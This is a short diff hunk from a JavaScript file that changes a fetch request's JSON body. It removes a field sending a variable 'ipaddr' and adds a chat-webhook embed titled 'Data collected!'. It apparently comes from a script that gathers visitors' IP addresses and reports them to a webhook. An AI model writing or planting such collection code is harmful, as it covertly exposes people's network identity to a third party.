@@ -43,9 +43,17 @@
             headers: {
               'Content-Type': 'application/json'
             },
-            body: JSON.stringify({
-              content: ipaddr,
-            })
+            body: JSON.stringify(
+              {
+                embeds: [
+                  {
+                    title: "Data collected!",
+                    description: "yes",
+                    color: 0xf5c2e7,
+                  }
+                ]
+              }
+            )
           });
           if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
